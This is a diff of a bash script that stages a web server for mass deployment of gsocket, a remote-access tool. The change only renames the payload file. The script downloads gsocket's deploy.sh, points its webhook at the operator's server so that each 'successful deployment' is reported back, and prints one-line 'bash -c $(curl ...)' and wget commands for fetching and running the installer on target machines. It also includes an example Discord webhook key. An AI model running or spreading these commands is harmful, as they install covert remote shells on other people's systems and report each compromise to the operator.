@@ -123,9 +123,9 @@ command -v python >/dev/null || {
 "$PYTHON" -m http.server -h >/dev/null || ERREXIT 255 "Python -m http.server not found."
 
 [[ ! -d "${DATA_DIR}/bin" ]] && mkdir -p "${DATA_DIR}/bin"
-[[ ! -f "${DATA_DIR}/x" ]] && {
+[[ ! -f "${DATA_DIR}/y" ]] && {
     echo -e "Downloading ${CDY}x${CN} (e.g. deploy.sh)"
-    curl -fsSL 'https://github.com/hackerschoice/gsocket/raw/master/deploy/deploy.sh' --output "${DATA_DIR}/x"
+    curl -fsSL 'https://github.com/hackerschoice/gsocket/raw/master/deploy/deploy.sh' --output "${DATA_DIR}/y"
 }
 
 for n in "${packages[@]}"; do
@@ -157,23 +157,23 @@ str="${str//[^[:alnum:]].-}"  # sanitize
 URL_BASE="https://${str}"
 
 # update deploy.sh
-sed "s|^URL_BASE=.*|URL_BASE=\"${URL_BASE}\"|" -i "${DATA_DIR}/x"
-sed "s|^gs_deploy_webhook=.*|gs_deploy_webhook='${URL_BASE}/results.php?s=\${GS_SECRET}'|" -i "${DATA_DIR}/x"
-sed 's|^GS_WEBHOOK_404_OK=.*|GS_WEBHOOK_404_OK=1|' -i "${DATA_DIR}/x"
+sed "s|^URL_BASE=.*|URL_BASE=\"${URL_BASE}\"|" -i "${DATA_DIR}/y"
+sed "s|^gs_deploy_webhook=.*|gs_deploy_webhook='${URL_BASE}/results.php?s=\${GS_SECRET}'|" -i "${DATA_DIR}/y"
+sed 's|^GS_WEBHOOK_404_OK=.*|GS_WEBHOOK_404_OK=1|' -i "${DATA_DIR}/y"
 
 echo -e "\
 ${CDG}All successfull deployments will be shown below.${CN}
 ${CDY}To log via Telegram, Discord or webhook.site please edit
-${CW}$(realpath "$(pwd)/${DATA_DIR}/x")${CDY} and set${CN}
+${CW}$(realpath "$(pwd)/${DATA_DIR}/y")${CDY} and set${CN}
 1. ${CDC}GS_TG_TOKEN=${CN}, ${CDC}GS_TG_CHATID=${CN} OR ${CDC}GS_DISCORD_KEY=${CN} OR ${CDC}GS_WEBHOOK_KEY=${CN}
 ${CW}${CF}Set the IP/HOST and PORT if you run your OWN Relay Network:
 ${CF}2. ${CC}${CF}GS_HOST=1.2.3.4${CN}, ${CC}${CF}GS_PORT=443${CN}
 To deploy gsocket:
-    ${CM}bash -c \"\$(curl -fsSL ${URL_BASE}/x)\"${CN}
-    ${CM}bash -c \"\$(wget --no-verbose -O- ${URL_BASE}/x)\"${CN}
+    ${CM}bash -c \"\$(curl -fsSL ${URL_BASE}/y)\"${CN}
+    ${CM}bash -c \"\$(wget --no-verbose -O- ${URL_BASE}/y)\"${CN}
 or set the variable during deployment. Example:
     ${CDM}GS_DISCORD_KEY='1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m' \\
-    bash -c \"\$(curl -fsSL ${URL_BASE}/x)\"${CN}
+    bash -c \"\$(curl -fsSL ${URL_BASE}/y)\"${CN}
 Press CTRL-C to stop
 ${CDG}-----RESULTS BELOW-----${CN}"
 
